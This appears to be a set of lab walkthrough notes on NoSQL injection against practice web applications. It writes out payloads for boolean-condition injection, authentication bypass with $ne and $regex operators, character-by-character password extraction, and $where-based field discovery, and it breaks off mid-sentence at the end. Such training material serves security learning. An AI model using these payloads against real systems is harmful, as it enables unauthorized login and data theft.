### Detecting NoSQL injection

Submit a valid javascript as a category:
`Gifts'+'`

After that, see if you can inject boolean conditions with this false condition `Gifts' && 0 && 'x` and a true one `Gifts' && 1 && 'x`

Submit a condition that is always true `Gifts'||1||'`

---
### Exploiting NoSQL operator injection to bypass authentication

Intercept your login request, and modify the username from "wiener" to `{"$ne":""}`. See that you can still log in

Change it now to this value `{"$regex":"wien.*"}` , and again you can log in. 

So, based on that info, this is your payload:
```text
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

---
### Exploiting NoSQL injection to extract data

Log in, in the request /user/lookup?user=wiener, add a `'` and you'll get "There was an error getting user details".

If you inject `wiener'+'` and URL encode, you get the info.
Submit a false condition: `wiener' && '1'=='2` and get "Could not find user".
Submit a true one: `wiener' && '1'=='1` and get the details.

Put this:
`administrator' && this.password.length < 30 || 'a'=='b` and you'll get the info for the admin user. This means the password is less than 30 characters.

If you go down that number, you can detect the password length is "8". 

Send that to intruder, with payload `administrator' && this.password[§0§]=='§a§`

Payload 1: numbers from 0 to 7
Payload 2: letters from a-z

URL ENCODE, start the attack. Filter by Length.
Based on payload 1 you get the index, payload 2 give the value. Form the password.

Password: klctqhnt

---
### Exploiting NoSQL operator injection to extract unknown fields

Try to log in with credentials "carlos":"invalid"

Send that POST /login request to repeater, replace 
```text
"invalid"  ==>>  {"$ne":"invalid"}
```

And you'll see "account locked"

Now use this payload:
`{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`
And you'll receive a "Invalid username or password" error

Change the "0" with a "1" and you'll get an account locked.

Send that to intruder, use this as your payload where `"Object.keys(this)[1].match('^.{§§}§§.*')"`

Select cluster bomb, payload 1 numbers from 0 to 20, payload 2 add `[a-z & A-Z & 0-9]`
Sort by Length, and you'll start to discover with the Payload 2 column, different fields. Change the number in braces [0] to keep discovering fields. You'll find 

